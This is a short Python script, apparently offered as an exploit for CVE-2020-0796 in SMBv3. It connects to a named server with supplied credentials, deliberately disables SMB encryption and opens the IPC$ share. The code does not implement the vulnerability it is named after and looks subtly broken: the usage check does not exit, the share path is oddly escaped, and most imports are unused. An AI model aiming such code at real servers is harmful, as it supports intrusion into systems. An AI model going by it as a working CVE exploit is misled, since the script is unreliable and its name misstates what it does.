#!/usr/bin/env python3

from smbclient import (
    link,
    open_file,
    remove,
    register_session,
    stat,
    symlink,
)

import sys

if len(sys.argv) < 4:
    print("usage: ./CVE-2020-0796.py servername username password")

register_session(sys.argv[1], username=sys.argv[2], 
    password=sys.argv[3], encrypt=False) # encryption must be disabled

with open_file("\\\{}\IPC$".format(sys.argv[1]), username=sys.argv[2], password=sys.argv[3]) as fd:
    file_contents = fd.read()
